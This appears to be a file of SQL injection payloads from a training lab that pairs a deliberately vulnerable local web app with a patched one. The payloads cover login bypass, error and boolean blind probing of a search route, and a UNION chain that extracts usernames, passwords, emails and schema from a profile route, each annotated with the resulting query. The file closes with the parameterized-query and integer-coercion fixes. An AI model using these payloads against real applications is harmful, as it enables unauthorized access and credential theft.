@@ -1,0 +1,122 @@
+# ===========================================================================
+# SQL Injection Payloads
+# Target: VULNERABLE version — http://localhost:5001
+#
+# Three difficulty levels:
+#   3a. Login bypass (easy)
+#   3b. Error leak + boolean blind — search route (intermediate)
+#   3c. UNION-based extraction chain — profile route (advanced)
+# ===========================================================================
+
+
+# ---------------------------------------------------------------------------
+# 3a. LOGIN BYPASS (easy)
+# Route: POST /login
+# Injected field: username
+# Base query built in app.py:
+#   SELECT id, username, role FROM users
+#   WHERE username='{u}' AND password='{p}'
+# ---------------------------------------------------------------------------
+
+# --- 3a-1: Classic OR bypass — logs in as the first user in the table ---
+#   username field: ' OR '1'='1' --
+#   password field: anything (e.g.  x)
+#
+#   Resulting query:
+#     SELECT id, username, role FROM users
+#     WHERE username='' OR '1'='1' --' AND password='x'
+#   The -- comments out the password check; '1'='1' is always true.
+Username: ' OR '1'='1' --
+Password: x
+
+# --- 3a-2: Target a specific user by name without knowing their password ---
+#   username field: alice' --
+#   password field: anything
+#
+#   Resulting query:
+#     SELECT ... WHERE username='alice' --' AND password='anything'
+Username: alice' --
+Password: anythinghere
+
+# --- 3a-3: Admin bypass ---
+Username: admin' --
+Password: anythinghere
+
+
+# ---------------------------------------------------------------------------
+# 3b. SEARCH — ERROR LEAK + BOOLEAN BLIND (intermediate)
+# Route: GET /search?q=<payload>
+# Base query built in app.py:
+#   SELECT * FROM courses WHERE title LIKE '%{term}%' OR code LIKE '%{term}%'
+# ---------------------------------------------------------------------------
+
+# --- 3b-1: Syntax error to confirm injection point ---
+#   The app echoes the raw sqlite3.OperationalError message.
+http://localhost:5001/search?q='
+
+#   Expected error in page: "Database error: unrecognized token: ...'"
+
+# --- 3b-2: Boolean blind — true condition (returns results) ---
+http://localhost:5001/search?q=%' OR '1'='1
+
+# --- 3b-3: Boolean blind — false condition (returns no results) ---
+http://localhost:5001/search?q=%' OR '1'='2
+
+# --- 3b-4: UNION to extract usernames and passwords ---
+#   Columns in courses: id, code, title, instructor, credits (5 columns)
+#   Pad the UNION SELECT to match 5 columns:
+http://localhost:5001/search?q=' UNION SELECT 1,username,password,email,4 FROM users --
+
+#   Result: user rows appear in the course-card grid; password column maps to
+#   the "title" field (middle column) which is displayed on each card.
+
+
+# ---------------------------------------------------------------------------
+# 3c. PROFILE — UNION-BASED FULL EXTRACTION CHAIN (advanced)
+# Route: GET /profile/<uid>
+# Base query built in app.py:
+#   SELECT * FROM users WHERE id={uid}
+#   (uid is NOT coerced to int — raw string interpolated)
+# ---------------------------------------------------------------------------
+
+# --- Step 1: Confirm number of columns in users table ---
+#   Try ORDER BY until it errors:
+http://localhost:5001/profile/1 ORDER BY 5--        <- succeeds (5 columns)
+http://localhost:5001/profile/1 ORDER BY 6--        <- errors -> 5 columns confirmed
+
+# --- Step 2: Find a uid that returns no real row so UNION result is shown ---
+http://localhost:5001/profile/0
+
+# --- Step 3: Basic UNION — extract first user row ---
+http://localhost:5001/profile/0 UNION SELECT 1,username,password,role,email FROM users LIMIT 1
+
+# --- Step 4: Extract specific user (admin) ---
+http://localhost:5001/profile/0 UNION SELECT id,username,email,role,password FROM users WHERE role='admin'
+
+# --- Step 5: Enumerate all users with OFFSET ---
+#   OFFSET 0 = alice, OFFSET 1 = bob, OFFSET 2 = carol, OFFSET 3 = admin
+http://localhost:5001/profile/0 UNION SELECT id,username,email,role,password FROM users LIMIT 1 OFFSET 0
+http://localhost:5001/profile/0 UNION SELECT id,username,email,role,password FROM users LIMIT 1 OFFSET 1
+http://localhost:5001/profile/0 UNION SELECT id,username,email,role,password FROM users LIMIT 1 OFFSET 2
+http://localhost:5001/profile/0 UNION SELECT id,username,email,role,password FROM users LIMIT 1 OFFSET 3
+
+# --- Step 6: Extract table names from sqlite_master ---
+http://localhost:5001/profile/0 UNION SELECT 1,name,3,4,sql FROM sqlite_master WHERE type='table' LIMIT 1
+
+# URL-encoded versions (paste directly into browser address bar):
+# Step 3 encoded:
+http://localhost:5001/profile/0%20UNION%20SELECT%201%2Cusername%2Cpassword%2Crole%2Cemail%20FROM%20users%20LIMIT%201
+
+# Step 4 encoded:
+http://localhost:5001/profile/0%20UNION%20SELECT%20id%2Cusername%2Cemail%2Crole%2Cpassword%20FROM%20users%20WHERE%20role%3D%27admin%27
+
+# ===========================================================================
+# Expected result on VULNERABLE (:5001):
+#   All payloads above succeed and return sensitive data.
+#
+# Expected result on SAFE (:5002):
+#   3a: Parameterized query — payload treated as a literal string, no bypass.
+#   3b: Parameterized LIKE — malformed SQL rejected by driver before execution;
+#       DB errors never echoed to the page.
+#   3c: int() coercion aborts with HTTP 400 before the query is built.
+# ===========================================================================
